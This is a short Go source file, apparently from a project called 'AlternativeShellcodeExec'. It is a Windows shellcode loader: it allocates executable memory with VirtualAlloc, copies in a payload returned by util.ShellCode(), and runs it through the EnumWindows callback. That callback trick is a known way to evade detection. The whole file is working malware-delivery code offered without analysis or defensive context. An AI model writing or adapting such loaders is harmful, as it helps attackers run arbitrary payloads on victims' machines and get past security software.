package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// Process op array
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// Use EnumWindows to call the shellcode
	user32, _ := syscall.LoadDLL("user32.dll")
	enumWindows, _ := user32.FindProc("EnumWindows")
	ret, _, err := enumWindows.Call(addr, 0)
	if err != nil {
		fmt.Println("Error EnumWindows", err)
		return
	}
	if ret == 0 {
		println("EnumWindows failed:", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
